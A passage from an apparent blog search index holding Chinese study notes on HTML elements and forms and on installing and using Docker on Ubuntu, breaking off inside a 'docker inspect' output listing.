\u0026lt;hr/\u0026gt; \u0026lt;!--无序列表--\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;java\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;python\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;c/c++\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;hr/\u0026gt; \u0026lt;!--自定义列表--\u0026gt; \u0026lt;dl\u0026gt; \u0026lt;dt\u0026gt;语言\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;java\u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;python\u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;c/c++\u0026lt;/dd\u0026gt; \u0026lt;dt\u0026gt;省\u0026lt;/dt\u0026gt; \u0026lt;dd\u0026gt;Shanxi\u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;Shanghai\u0026lt;/dd\u0026gt; \u0026lt;dd\u0026gt;Beijing\u0026lt;/dd\u0026gt; \u0026lt;/dl\u0026gt;   dl:标签 dt:列表名称 dd:列表内容 表格  基本结构  单元格 行tr table rows 列td 跨行 跨列    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  \u0026lt;!-- 三行三列，属性border边框宽度1px --\u0026gt; \u0026lt;table border=\u0026#34;1px\u0026#34;\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;!--colspan 跨列--\u0026gt; \u0026lt;td colspan=\u0026#34;3\u0026#34;\u0026gt;1-1\u0026lt;/td\u0026gt; \u0026lt;!--跨三列--\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td rowspan=\u0026#34;2\u0026#34;\u0026gt;2-1\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;2-2\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;2-3\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;3-1\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;3-2\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/table\u0026gt;   媒体元素 1 2 3 4 5 6  \u0026lt;视频\u0026gt; \u0026lt;video src=\u0026#34;path\u0026#34; controls autoplay\u0026gt;\u0026lt;/video\u0026gt; \u0026lt;!--scr资源路径，controls 视频控制条，autoplay自动播放--\u0026gt; \u0026lt;音频\u0026gt; \u0026lt;audio src=\u0026#34;path\u0026#34; controls autoplay\u0026gt;\u0026lt;/audio\u0026gt;   页面结构分析  header：标题头部区域内容（用于页面或页面中的一块区域） footer ：标记脚部区域的内容（用于整个页面或页面的一块区域） section：Web页面中的一块独立区域 article：独立的文章内容 aside：相关内容或应用（常用于侧边栏） nav：导航类辅助内容  iframe内联框架 1 2 3 4 5 6 7  \u0026lt;!--src:地址 name:框架表示名--\u0026gt; \u0026lt;iframe src=\u0026#34;path\u0026#34; name=\u0026#34;mainFrame\u0026#34; frameborder=\u0026#34;0\u0026#34; width=\u0026#34;apx\u0026#34; height=\u0026#34;bpx\u0026#34; \u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;!--src和frameborder必有--\u0026gt; \u0026lt;!--有了name之后可以被作为锚链接对象--\u0026gt; \u0026lt;a href=\u0026#34;path\u0026#34; target=\u0026#34;mainFrame\u0026#34;\u0026gt;链接文本或图像\u0026lt;/a\u0026gt; \u0026lt;!--target表明该链接打开位置是frame处，iframe创造了一个页面内小窗口 src应该是初始显示，后来会被href覆盖--\u0026gt;   表单  form标签：必填action  1 2  \u0026lt;form method=\u0026#34;\u0026#34; action=\u0026#34;\u0026#34;\u0026gt; \u0026lt;!--method常用值get/post，action表示向何处发送表单数据（网站或者请求处理地址）--\u0026gt;   get 1 2 3 4 5  \u0026lt;form action=\u0026#34;xxx.html\u0026#34; method=\u0026#34;get\u0026#34;\u0026gt; \u0026lt;p\u0026gt;名字：\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;xxx\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;!--文本输入名字“text”，密码框“password”--\u0026gt; \u0026lt;p\u0026gt;密码：\u0026lt;imput type=\u0026#34;password\u0026#34; name=\u0026#34;xxx\u0026#34;\u0026lt;/p\u0026gt;   get方式提交可以在url处看到我们提交的信息，高效但不安全 post(其实和get一样) 1 2 3 4 5  \u0026lt;form action=\u0026#34;xxx.html\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;p\u0026gt;名字：\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;xxx\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;!--文本输入名字“text”，密码框“password”--\u0026gt; \u0026lt;p\u0026gt;密码：\u0026lt;imput type=\u0026#34;password\u0026#34; name=\u0026#34;xxx\u0026#34;\u0026lt;/p\u0026gt;   post比较安全，而且可以传输大文件 审查元素\u0026ndash;network\u0026ndash;找到第一个包\u0026ndash;headers\u0026ndash;form data处有表单信息 可以有其他高级方式加密，可在此处也不显示 表单元素格式  type：指定元素的类型。text文本、password密码、checkbox、单选框radio、submit、reset、file、hidden、image、button，默认为text name：指定表单的名称 value：元素的初始值。type为radio时必须指定的值 size：指定表单元素的初始宽度。当type为text或passwprd时，表单元素的大小以字符为单位。对于其他类型，宽度以像素为单位 maxlength:type为text或password时，输入的最大字符数 checked：type为radio或checkbox时，指定按钮是否被选中  1 2 3 4 5  \u0026lt;!--单选框--\u0026gt; \u0026lt;p\u0026gt; \u0026lt;input type=\u0026#34;radio\u0026#34; value=\u0026#34;boy\u0026#34; name=\u0026#34;sex\u0026#34;/ checked\u0026gt;男 \u0026lt;input type=\u0026#34;radio\u0026#34; value=\u0026#34;girl\u0026#34; name=\u0026#34;sex\u0026#34;/\u0026gt;女 \u0026lt;/p\u0026gt;   name相同，将二者放在同一组别下，实现二选一的效果 后面的汉字时显示的，值是存储起来的 1 2 3 4 5 6 7  \u0026lt;!--多选框--\u0026gt; \u0026lt;P\u0026gt; \u0026lt;imput type=\u0026#34;checkbox\u0026#34; value=\u0026#34;sleep\u0026#34; name=\u0026#34;hobby\u0026#34;\u0026gt;睡觉 \u0026lt;imput type=\u0026#34;checkbox\u0026#34; value=\u0026#34;code\u0026#34; name=\u0026#34;hobby\u0026#34; checked\u0026gt;敲代码 \u0026lt;imput type=\u0026#34;checkbox\u0026#34; value=\u0026#34;chat\u0026#34; name=\u0026#34;hobby\u0026#34;\u0026gt;聊天 \u0026lt;/p\u0026gt; \u0026lt;!--系统会把name看作数组--\u0026gt;   checked默认选中 按钮 1 2 3 4 5 6  \u0026lt;P\u0026gt; \u0026lt;input type=\u0026#34;button\u0026#34; name=\u0026#34;xxx\u0026#34; value=\u0026#34;xxxx\u0026#34;\u0026gt;\u0026lt;!--普通按钮--\u0026gt; \u0026lt;input type=\u0026#34;image\u0026#34; src=\u0026#34;path\u0026#34;\u0026gt;\u0026lt;!--图片按钮--\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt;\u0026lt;!--提交按钮--\u0026gt; \u0026lt;input type=\u0026#34;reset\u0026#34;\u0026gt;\u0026lt;!--重置按钮--\u0026gt; \u0026lt;/p\u0026gt;   下拉框 1 2 3 4 5 6 7 8  \u0026lt;p\u0026gt;国家： \u0026lt;select name=\u0026#34;列表名称\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;选项的值\u0026#34;\u0026gt;值\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;china\u0026#34; selected\u0026gt;中国\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;usa\u0026#34;\u0026gt;美国\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;india\u0026#34;\u0026gt;印度\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/p\u0026gt;   selected设置默认值 文本域 1 2 3  \u0026lt;p\u0026gt;反馈： \u0026lt;textarea name=\u0026#34;textarea\u0026#34; cols=\u0026#34;50\u0026#34; rows=\u0026#34;10\u0026#34;\u0026gt;文本内容\u0026lt;/textarea\u0026gt; \u0026lt;/p\u0026gt;   cols列rows行 文件域 1 2 3  \u0026lt;p\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;files\u0026#34;\u0026gt; \u0026lt;/p\u0026gt;   邮件验证 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  \u0026lt;p\u0026gt; 邮箱： \u0026lt;input type=\u0026#34;email\u0026#34; name=\u0026#34;email\u0026#34;\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; url： \u0026lt;input type=\u0026#34;url\u0026#34; name=\u0026#34;url\u0026#34;\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; 数字： \u0026lt;input type=\u0026#34;number\u0026#34; name=\u0026#34;number\u0026#34; max=\u0026#34;100\u0026#34; min=\u0026#34;0\u0026#34; step=\u0026#34;10\u0026#34;\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;!--最大值最小值步长--\u0026gt; \u0026lt;p\u0026gt;滑块： \u0026lt;input type=\u0026#34;range\u0026#34; name=\u0026#34;voice\u0026#34; min=\u0026#34;0\u0026#34; max=\u0026#34;100\u0026#34; step=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;搜索： \u0026lt;input type=\u0026#34;search\u0026#34; name=\u0026#34;search\u0026#34;\u0026gt; \u0026lt;/p\u0026gt;   ","permalink":"https://WnQinm.github.io/2022/09/html_init/","tags":["net"],"title":"html初识"},{"categories":["Docker"],"contents":"docker基础知识学习笔记，来源于bilibili up主 \u0026lsquo;遇见狂神说\u0026rsquo; intro Docker是基于Go语言开发的开源项目 官网：https://www.docker.com/ 文档：https://docs.docker.com/ 超级详细 仓库：https://hub.docker.com/ Docker能做什么 一般来说，电脑有内核（Kernel），库/环境（Lib），以及各种应用app 虚拟机技术 模拟了绝大部分组成，导致一些缺点： 1、资源占用多 2、冗余步骤多 3、启动慢 容器化技术 没有模拟一个完整的操作系统，只打包了Lib和各种apps，这些docker共用一个内核，可以最大化压榨内核潜力，同时各个docker互不干扰，避免某个docker环境等配置失败导致机器不能正常使用 由于容器没有内核，也没有虚拟其他硬件，使得容器十分轻便，我们可以安装多个docker 应用更快速的交付和部署 传统：一堆帮助文档，安装程序 Docker：打包镜像发布测试，一键运行 更便捷的升级和扩缩容 可以类似搭积木来部署应用 更简单的系统运维 容器化之后，我们的开发，测试环境都是高度一致的 更高效的计算资源利用 Docker是内核级别的虚拟化，可以在一个物理机上运行很多的容器实例。服务器的性能可以被压榨到极致 Docker基本组成 镜像（image）： docker镜像类似于一个模板，可以通过这个模板来创建容器服务，xxx镜像-\u0026gt;run-\u0026gt;xxx01容器（提供服务器），通过这个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器中的） 容器（container）： Docker利用容器技术，独立运行一个或者一组应用，通过镜像来创建的 启动，停止，删除（基本命令） 仓库（repository）： 类似于github，国外有dockerhub，国内阿里云等需要配置镜像加速 install Docker 我这里是将docker安装到云服务器上，相关下载帮助文档如图所示 网速堪忧，最好提前在服务器部署clash 系统版本 1 2 3 4 5 6 7 8 9 10 11 12 13  $ cat /etc/os-release NAME=\u0026#34;Ubuntu\u0026#34; VERSION=\u0026#34;20.04 LTS (Focal Fossa)\u0026#34; ID=ubuntu ID_LIKE=debian PRETTY_NAME=\u0026#34;Ubuntu 20.04 LTS\u0026#34; VERSION_ID=\u0026#34;20.04\u0026#34; HOME_URL=\u0026#34;https://www.ubuntu.com/\u0026#34; SUPPORT_URL=\u0026#34;https://help.ubuntu.com/\u0026#34; BUG_REPORT_URL=\u0026#34;https://bugs.launchpad.net/ubuntu/\u0026#34; PRIVACY_POLICY_URL=\u0026#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\u0026#34; VERSION_CODENAME=focal UBUNTU_CODENAME=focal   帮助文档（ubuntu）： https://docs.docker.com/engine/install/ubuntu/ 1 2  # uninstall old versions sudo apt-get remove docker docker-engine docker.io containerd runc   install using the repository 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  # set up the repository # update some packages sudo apt-get update sudo apt-get install \\  ca-certificates \\  curl \\  gnupg \\  lsb-release # add Docker\u0026#39;s official GPG key sudo mkdir -p /etc/apt/keyrings curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg # set up the repository echo \\  \u0026#34;deb [arch=$(dpkg --print-architecture)signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs)stable\u0026#34; | sudo tee /etc/apt/sources.list.d/docker.list \u0026gt; /dev/null   只要没有报错就成功 设置阿里云镜像软件源 这里的设置和上面紧挨着的\u0026rsquo;# set up the repository'冲突，选择其一即可 1 2 3 4 5  # 安装add-apt-repository sudo apt update sudo apt install software-properties-common # 设置镜像软件源 sudo add-apt-repository \u0026#34;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs)stable\u0026#34;   install Docker Engine (ce社区版，ee企业版) 1 2  sudo apt-get update sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin   (如果网络不好，下载超级慢) (第二遍跟着这个路径走，就算设置了镜像也很慢~) 启动docker 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  $ sudo systemctl start docker $ sudo docker version Client: Docker Engine - Community Version: 20.10.18 API version: 1.41 Go version: go1.18.6 Git commit: b40c2f6 Built: Thu Sep 8 23:11:45 2022 OS/Arch: linux/amd64 Context: default Experimental: true Server: Docker Engine - Community Engine: Version: 20.10.18 API version: 1.41 (minimum version 1.12) Go version: go1.18.6 Git commit: e42327a Built: Thu Sep 8 23:09:37 2022 OS/Arch: linux/amd64 Experimental: false containerd: Version: 1.6.8 GitCommit: 9cd3357b7fd7218e4aec3eae239db1f68a5a6ec6 runc: Version: 1.1.4 GitCommit: v1.1.4-0-g5fd4c4d docker-init: Version: 0.19.0 GitCommit: de40ad0   测试hello-world 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  $ sudo docker run hello-world Unable to find image \u0026#39;hello-world:latest\u0026#39; locally latest: Pulling from library/hello-world 2db29710123e: Pull complete Digest: sha256:62af9efd515a25f84961b70f973a798d2eca956b1b2b026d0a4a63a3b0b6a3f2 Status: Downloaded newer image for hello-world:latest Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker client contacted the Docker daemon. 2. The Docker daemon pulled the \u0026#34;hello-world\u0026#34; image from the Docker Hub. (amd64) 3. The Docker daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker daemon streamed that output to the Docker client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash Share images, automate workflows, and more with a free Docker ID: https://hub.docker.com/ For more examples and ideas, visit: https://docs.docker.com/get-started/   查看已有镜像列表 1 2 3  $ sudo docker images REPOSITORY TAG IMAGE ID CREATED SIZE hello-world latest feb5d9fea6a5 11 months ago 13.3kB   卸载Docker 1、Uninstall the Docker Engine, CLI, Containerd, and Docker Compose packages: 1  sudo apt-get purge docker-ce docker-ce-cli containerd.io docker-compose-plugin   2、Images, containers, volumes, or customized configuration files on your host are not automatically removed. To delete all images, containers, and volumes: 1 2  sudo rm -rf /var/lib/docker sudo rm -rf /var/lib/containerd   Docker的常用命令 ps.后面一定位置开始我嫌麻烦，所以将sudo docker简写为sdr 帮助命令 1 2 3  docker version # 显示docker的版本信息 docker info # 显示docker的系统信息，包括镜像和容器的数量 docker \u0026lt;command\u0026gt; --help # 帮助命令   帮助文档的地址：https://docs.docker.com/reference/ 镜像命令 docker images查看所有本地主机上的镜像 1 2 3 4 5 6 7 8 9 10 11 12 13 14  $ sudo docker images REPOSITORY TAG IMAGE ID CREATED SIZE hello-world latest feb5d9fea6a5 11 months ago 13.3kB # 解释 REPOSITORY 镜像的仓库源 TAG 镜像的标签 IMAGE ID 镜像的id CREATED 镜像的创建时间 SIZE 镜像的大小 # 可选项 -a, --all # 列出所有镜像 -q, --quiet # 只显示镜像的id   docker search搜索镜像 1 2 3 4 5 6  $ sudo docker search mysql NAME DESCRIPTION STARS OFFICIAL AUTOMATED mysql MySQL is a widely used, open-source relation… 13187 [OK] mariadb MariaDB Server is a high performing open sou… 5040 [OK] $ sudo docker search mysql --filter=STARS=3000 #搜索stars不少于3000的镜像   docker pull下载镜像 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  # 下载镜像 docker pull 镜像名[:tag] $ sudo docker pull mysql Using default tag: latest # 如果不写 tag，默认就是 latest latest: Pulling from library/mysql 051f419db9dd: Pull complete # 分层下载，docker image的核心 联合文件系统 7627573fa82a: Pull complete a44b358d7796: Pull complete 95753aff4b95: Pull complete a1fa3bee53f4: Pull complete f5227e0d612c: Pull complete b4b4368b1983: Pull complete f26212810c32: Pull complete d803d4215f95: Pull complete d5358a7f7d07: Pull complete 435e8908cd69: Pull complete Digest: sha256:b9532b1edea72b6cee12d9f5a78547bd3812ea5db842566e17f8b33291ed2921 # 签名（防伪标志） Status: Downloaded newer image for mysql:latest docker.io/library/mysql:latest # 真实地址 # 二者等价： docker pull mysql docker pull docker.io/library/mysql:latest # 指定版本下载 $ sudo docker pull mysql:5.7 5.7: Pulling from library/mysql 9815334b7810: Pull complete # 如果之前下载过某些层，就会显示\u0026#34;Already exists 直接拿过来用而不重新下载 f85cb6fccbfd: Pull complete b63612353671: Pull complete 447901201612: Pull complete 9b6bc806cc29: Pull complete 24ec1f4b3b0d: Pull complete 207ed1eb2fd4: Pull complete 27cbde3edd97: Pull complete 0a5aa35cc154: Pull complete e6c92bf6471b: Pull complete 07b80de0d1af: Pull complete Digest: sha256:c1bda6ecdbc63d3b0d3a3a3ce195de3dd755c4a0658ed782a16a0682216b9a48 Status: Downloaded newer image for mysql:5.7 docker.io/library/mysql:5.7   docker rmi删除镜像 docker rmi -f 镜像id [镜像id] [镜像id] \u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  $ sudo docker images REPOSITORY TAG IMAGE ID CREATED SIZE mysql latest 43fcfca0776d 35 hours ago 449MB mysql 5.7 daff57b7d2d1 3 weeks ago 430MB hello-world latest feb5d9fea6a5 11 months ago 13.3kB $ sudo docker rmi -f daff57b7d2d1 # 根据id删除镜像 Untagged: mysql:5.7 Untagged: mysql@sha256:c1bda6ecdbc63d3b0d3a3a3ce195de3dd755c4a0658ed782a16a0682216b9a48 Deleted: sha256:daff57b7d2d1e009d0b271972f62dbf4de64b8cdb9cd646442aeda961e615f44 Deleted: sha256:a2b6de0d8fad38b5d19b0207decce5994598e15ae6aaf974733924dcbd8f04de Deleted: sha256:f3bd23ad30ca816481c810885546988744e444e8b4f52c196c29d5e3f667157f Deleted: sha256:7789a0eac346070602d9fae747fb5d81952454c6e11d5381cbc12a4825198d6e Deleted: sha256:2cdfa876efe3302b715dad6bfd13cee0c512c58843200920953efe3355f5931c Deleted: sha256:8d4cf9ffb69b960e2a2ebb157660b37a15ea645a71791aefc2b1600f1f603ebb Deleted: sha256:d98069632a6bb3b2ba690a11cff2481a9b954aba58a7c3388484dd65ef8e1580 Deleted: sha256:0295feed0657a087e23700dcf0e41069bf8c565a092eea9426be99d8de5a45dc Deleted: sha256:c9a9086bbafa8383c2002a50cce49e22bd060897dc121c18b41a9893b83816f5 Deleted: sha256:ed4bd9721438e36a8667ddcb461b958473d7b5f155df32155e08764648486087 Deleted: sha256:018f336482437233f5c9e135a18f5ba391448340d3ef2ec99fd88ab599906463 Deleted: sha256:bcf2a1ad6472a891de95b5132d013c064a07ec9995cb61b0cc0f8d4a4ea855fb $ sudo docker rmi -f $(sudo docker images -aq) # $()传入多个参数，这里传入所有镜像的id然后删除 Untagged: mysql:latest Untagged: mysql@sha256:b9532b1edea72b6cee12d9f5a78547bd3812ea5db842566e17f8b33291ed2921 Deleted: sha256:43fcfca0776df8e192d1647da2866237fbd9f8e875fb496e4ca887369b2dd995 Deleted: sha256:45d11760ca3e62bb36a589002b413a42c60c9b917b7a089b116c1ab69155aa4d Deleted: sha256:af1876abdf5bbbef0ac13e24068669d600bf7de8aa74f31a43ae5f56b83331c2 Deleted: sha256:e1668f1334215580aa7a19beef5d1ee6c6ba121c305154f1ddd7253e21bf65e8 Deleted: sha256:91d92a76bd6a29d88aa511715731ac59d1df33c8e4f5b393dbc16c16b9c08b1c Deleted: sha256:8608eb76a683654e96af6087a19f416c4498e46f1121e15d63d2ce983750a3a2 Deleted: sha256:fd95c084aad87623a6db2c76480f0765e16ae2ba6de68ce1aefdb7ea4e8fe120 Deleted: sha256:968e68a28e13606ce58651654f554c342f51d5f3ea7e792cdcb21809fefe1a4f Deleted: sha256:15628dda9c1556632ae3577f5dd8ff16c6456fb95da60284783e8c1f89c588ae Deleted: sha256:49904d4d7d64ce4a3b64466e4d9bdc624fa8acc760c6a622dcbde03a0ada9fed Deleted: sha256:df0e3d67e1ecb153c572e3110d36a8bbc46ded2dc376395384c6171732241d90 Deleted: sha256:05dc728e5e49b5db657ec403b875f757afdd8d31f624eea76d706d6eee6395b2 Untagged: hello-world:latest Untagged: hello-world@sha256:62af9efd515a25f84961b70f973a798d2eca956b1b2b026d0a4a63a3b0b6a3f2 Deleted: sha256:feb5d9fea6a5e9606aa995e879d862b825965ba48de054caab5ef356dc6b3412   容器命令  有了镜像才可以创建容器，linux，下载一个centos镜像:docker pull centos  新建容器并启动 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  docker run [可选参数] image # 参数说明 --name=\u0026#34;Name\u0026#34; # 容器名字 区分容器 -d # 后台方式运行（linux本身是nohup） -it # 使用交互方式运行，进入容器查看内容 -p # 指定容器的端口 -p 8080:8080 -p ip:主机端口:容器端口 -p 主机端口:容器端口 -p 容器端口 容器端口 -P # 随机指定端口 # 测试，启动并进入容器 $ sudo docker run -it centos /bin/bash [root@f4373afebe37 /]# ls # 查看容器内的centos，基础版本，很多命令不完善 bin etc lib lost+found mnt proc run srv tmp var dev home lib64 media opt root sbin sys usr # 从容器中退回主机 [root@f4373afebe37 /]# exit exit $ ls blog clash   列出所有运行中容器 1 2 3 4 5  # docker ps 命令 # 列出当前正在运行的容器 -a # 列出当前正在运行的容器+带出历史运行过的容器 -n=? # 显示最近创建的容器 -q # 只显示容器的编号   退出容器 1 2  exit # 直接容器停止并退出 CTRL + P + Q # 容器不停止退出   删除容器 1 2 3  docker rm 容器id # 删除指定容器，不能删除正在运行的容器 docker rm -f $(docker ps -aq) # 删除所有容器 docker ps -aq | xargs docker rm # 删除所有容器   启动和停止容器 1 2 3 4  docker start 容器id # 启动容器 docker restart 容器id # 重启容器 docker stop 容器id # 停止当前正在运行的容器 docker kill 容器id # 强制停止容器   常用其他命令 后台启动容器 1 2 3 4 5 6 7  # 命令 docker run -d 镜像名 $ sudo docker run -d centos # docker ps 发现centos停止了 # 常见的坑，docker 容器使用后台运行，就必须要有一个前台进程，docker发现没有应用，就会自动停止 # nginx，容器启动后，发现自己没有提供服务，就会立刻停止，就是没有程序了   查看日志 1 2 3 4 5 6 7 8 9 10 11 12 13  docker logs -f -t --tail \u0026lt;num\u0026gt; 容器id # 空挂容器会导致关机或者logs为空 # 后台开启一个容器并运行一个脚本 $ sudo docker run -d centos /bin/sh -c \u0026#34;while true;do echo hello;sleep 1;done\u0026#34; # 显示日志 -tf # 显示所有日志，t时间戳，f持续输出 -tail number# 要显示的日志条数 $ sudo docker logs -ft --tail 10 2cb886ae2fa9 # 10为日志条数，由于加了参数f，会持续输出日志 2022-09-16T10:33:50.928401034Z hello 2022-09-16T10:33:51.930308966Z hello 2022-09-16T10:33:52.932148793Z hello 2022-09-16T10:33:53.933995843Z hello   查看容器中的进程信息 1 2 3 4 5  # 命令 docker top 容器id $ sudo docker top 2cb886ae2fa9 UID PID PPID C STIME TTY TIME CMD root 162268 162248 0 18:32 ? root 164167 162268 0 18:40 ?   查看镜像的元数据 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209  # 命令 docker inspect 容器id $ sudo docker inspect 2cb886ae2fa9 [ { \u0026#34;Id\u0026#34;: \u0026#34;2cb886ae2fa927bc1bca61010b04a97f3aadf0a5e0d830c98dca6a920278017e\u0026#34;, \u0026#34;Created\u0026#34;: \u0026#34;2022-09-16T10:32:21.383810621Z\u0026#34;, \u0026#34;Path\u0026#34;: \u0026#34;/bin/sh\u0026#34;, \u0026#34;Args\u0026#34;: [ \u0026#34;-c\u0026#34;, \u0026#34;while true;do echo hello;sleep 1;done\u0026#34; ], \u0026#34;State\u0026#34;: { \u0026#34;Status\u0026#34;: \u0026#34;running\u0026#34;, \u0026#34;Running\u0026#34;: true, \u0026#34;Paused\u0026#34;: false, \u0026#34;Restarting\u0026#34;: false, \u0026#34;OOMKilled\u0026#34;: false, \u0026#34;Dead\u0026#34;: false, \u0026#34;Pid\u0026#34;: 162268, \u0026#34;ExitCode\u0026#34;: 0, \u0026#34;Error\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;StartedAt\u0026#34;: \u0026#34;2022-09-16T10:32:21.762354014Z\u0026#34;, \u0026#34;FinishedAt\u0026#34;: \u0026#34;0001-01-01T00:00:00Z\u0026#34; }, \u0026#34;Image\u0026#34;: \u0026#34;sha256:5d0da3dc976460b72c77d94c8a1ad043720b0416bfc16c52c45d4847e53fadb6\u0026#34;, \u0026#34;ResolvConfPath\u0026#34;: \u0026#34;/var/lib/docker/containers/2cb886ae2fa927bc1bca61010b04a97f3aadf0a5e0d830c98dca6a920278017e/resolv.conf\u0026#34;, \u0026#34;HostnamePath\u0026#34;: \u0026#34;/var/lib/docker/containers/2cb886ae2fa927bc1bca61010b04a97f3aadf0a5e0d830c98dca6a920278017e/hostname\u0026#34;, \u0026#34;HostsPath\u0026#34;: \u0026#34;/var/lib/docker/containers/2cb886ae2fa927bc1bca61010b04a97f3aadf0a5e0d830c98dca6a920278017e/hosts\u0026#34;, \u0026#34;LogPath\u0026#34;: \u0026#34;/var/lib/docker/containers/2cb886ae2fa927bc1bca61010b04a97f3aadf0a5e0d830c98dca6a920278017e/2cb886ae2fa927bc1bca61010b04a97f3aadf0a5e0d830c98dca6a920278017e-json.log\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;/festive_mclaren\u0026#34;, \u0026#34;RestartCount\u0026#34;: 0, \u0026#34;Driver\u0026#34;: \u0026#34;overlay2\u0026#34;, \u0026#34;Platform\u0026#34;: \u0026#34;linux\u0026#34;, \u0026#34;MountLabel\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;ProcessLabel\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;AppArmorProfile\u0026#34;: \u0026#34;docker-default\u0026#34;, \u0026#34;ExecIDs\u0026#34;: null, \u0026#34;HostConfig\u0026#34;: { \u0026#34;Binds\u0026#34;: null, \u0026#34;ContainerIDFile\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;LogConfig\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;json-file\u0026#34;, \u0026#34;Config\u0026#34;: {} }, \u0026#34;NetworkMode\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;PortBindings\u0026#34;: {}, \u0026#34;RestartPolicy\u0026#34;: { \u0026#34;Name\u0026#34;: \u0026#34;no\u0026#34;, \u0026#34;MaximumRetryCount\u0026#34;: 0 }, \u0026#34;AutoRemove\u0026#34;: false, \u0026#34;VolumeDriver\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;VolumesFrom\u0026#34;: null, \u0026#34;CapAdd\u0026#34;: null, \u0026#34;CapDrop\u0026#34;: null, \u0026#34;CgroupnsMode\u0026#34;: \u0026#34;host\u0026#34;, \u0026#34;Dns\u0026#34;: [], \u0026#34;DnsOptions\u0026#34;: [], \u0026#34;DnsSearch\u0026#34;: [], \u0026#34;ExtraHosts\u0026#34;: null, \u0026#34;GroupAdd\u0026#34;: null, \u0026#34;IpcMode\u0026#34;: \u0026#34;private\u0026#34;, \u0026#34;Cgroup\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;Links\u0026#34;: null, \u0026#34;OomScoreAdj\u0026#34;: 0, \u0026#34;PidMode\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;Privileged\u0026#34;: false, \u0026#34;PublishAllPorts\u0026#34;: false, \u0026#34;ReadonlyRootfs\u0026#34;: false, \u0026#34;SecurityOpt\u0026#34;: null, \u0026#34;UTSMode\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;UsernsMode\u0026#34;: 